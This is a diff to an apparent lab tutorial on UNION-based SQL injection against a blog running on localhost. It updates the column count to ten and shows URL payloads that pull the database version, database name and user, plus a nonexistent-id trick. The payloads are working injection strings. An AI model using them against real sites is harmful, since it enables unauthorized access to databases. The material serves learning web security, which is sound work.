@@ -29,33 +29,35 @@ And we get this error for response:
 This error indicate that the number of columns is not correct. So we keep adding numbers until we stop getting this erros
 
 ```shell
-http://localhost:8080/p/2 UNION SELECT 1,2,3,4,5,6,7,8,9/slug-name-post'
+http://localhost:8080/p/2 UNION SELECT 1,2,3,4,5,6,7,8,9,10/slug-name-post'
 ```
 
-We can see that the right number of columns is 9. Great! 
+We can see that the right number of columns is 10. Great! 
 
-Now all we have to do is getting the info we need out.
+You should see the numbers, most of them al least in de screen somewhere.
 
-To do this we have to call a post with that not exist. May be postId=-1, or 10000, like this:
-```shell
-http://localhost:8080/p/-1 UNION SELECT 1,2,3,4,5,6,7,8,9/slug-name-post'
-```
-
-And we get all our numbers in the screen! This is great!
-Ok, now for the **engine version** just replace one of the number with a query, like this:
+Ok, now for the **engine version** just replace one of the number with a query, like this, assuming that the number two is being shown:
 
 ```shell
-http://localhost:8080/p/2 UNION SELECT 1,version(),3,4,5,6,7,8,9/slug-name-post'
+http://localhost:8080/p/2 UNION SELECT 1,version(),3,4,5,6,7,8,9,10/slug-name-post'
 ```
 
 For the **database name** just replace one of the number with another query, like this:
 
 ```shell
-http://localhost:8080/p/2 UNION SELECT 1,database(),3,4,5,6,7,8,9/slug-name-post'
+http://localhost:8080/p/2 UNION SELECT 1,database(),3,4,5,6,7,8,9,10/slug-name-post'
 ```
 
 And finally, for the **user** you can do this:
 
 ```shell
-http://localhost:8080/p/2 UNION SELECT 1,user(),3,4,5,6,7,8,9/slug-name-post'
+http://localhost:8080/p/2 UNION SELECT 1,user(),3,4,5,6,7,8,9,10/slug-name-post'
 ```
+
+Finally, a little trick to display de information in a cleaner screen is to change the post number for another that does not exist, may be -1 or 10000, like this:
+
+```shell
+http://localhost:8080/p/-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10/slug-name-post'
+```
+
+This way all you get is the data you want.
